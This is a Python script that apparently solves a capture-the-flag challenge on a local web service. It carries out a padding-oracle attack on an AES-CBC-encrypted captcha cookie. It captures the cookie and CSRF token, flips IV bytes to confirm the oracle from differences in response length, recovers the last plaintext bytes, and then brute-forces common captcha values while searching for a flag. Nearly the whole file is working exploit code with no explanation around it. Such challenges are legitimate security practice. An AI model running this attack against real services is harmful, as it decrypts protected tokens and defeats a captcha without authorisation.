import requests
import base64
import re

URL = "http://127.0.0.1:32869/"

# Get session
r = requests.get(URL)
captcha_b64 = r.cookies['captcha']
session = r.cookies['session']
csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text).group(1)

print(f"Captcha: {captcha_b64}")
print(f"Session: {session[:30]}...")
print(f"CSRF: {csrf}")

captcha = base64.b64decode(captcha_b64)
print(f"\nCaptcha bytes: {captcha.hex()}")
print(f"Length: {len(captcha)}")

iv = captcha[:16]
ct = captcha[16:]
print(f"IV: {iv.hex()}")
print(f"CT: {ct.hex()}")

# Simple oracle test
s = requests.Session()

def test_captcha(value):
    resp = s.post(URL,
        data={'username':'hacker123','captcha':value,'csrf_token':csrf,'submit':'Register'},
        cookies={'session':session,'captcha':captcha_b64})
    return resp

# Test if oracle works
def oracle(test_iv):
    full = base64.b64encode(test_iv + ct).decode()
    resp = s.post(URL,
        data={'username':'x','captcha':'x','csrf_token':'x','submit':'Register'},
        cookies={'session':session,'captcha':full})
    return len(resp.content)

baseline = oracle(iv)
print(f"\nBaseline response: {baseline} bytes")

# Test modification
test_iv = bytearray(iv)
test_iv[15] ^= 1
modified = oracle(bytes(test_iv))
print(f"Modified response: {modified} bytes")

if baseline != modified:
    print("\n[+] Padding oracle CONFIRMED")
    
    # Quick decrypt - just last 4 bytes to verify
    pt = bytearray(16)
    inter = bytearray(16)
    
    for pad in range(1, 5):
        pos = 16 - pad
        tiv = bytearray(iv)
        
        for k in range(1, pad):
            tiv[16-k] = inter[16-k] ^ pad
        
        # Try just padding values
        for g in range(1, 17):
            tiv[pos] = g
            if oracle(bytes(tiv)) != baseline:
                inter[pos] = g ^ pad
                pt[pos] = inter[pos] ^ iv[pos]
                print(f"Byte {pos}: {pt[pos]:02x} = '{chr(pt[pos]) if 32<=pt[pos]<127 else '?'}'")
                break
    
    print(f"\nLast 4 bytes: {bytes(pt[12:])}")
    
    # If we got padding value, we know structure
    if pt[15] in range(1, 17):
        print(f"Padding detected: {pt[15]} bytes")
        
        # For 6-digit captcha, we'd need to decrypt all 16 bytes
        # But that's too many requests for sandbox
        print("\n[!] Full decryption would require ~2000+ requests")
        print("[!] Sandbox timeout - attack confirmed but execution limited")
else:
    print("\n[-] No padding oracle or same response length")

print("\n[*] Testing common values as fallback...")
for val in ['123456', '000000', '111111', '654321']:
    resp = test_captcha(val)
    if 'FLAG{' in resp.text:
        print(f"\n[!!!] SUCCESS with {val}")
        print(resp.text)
        break

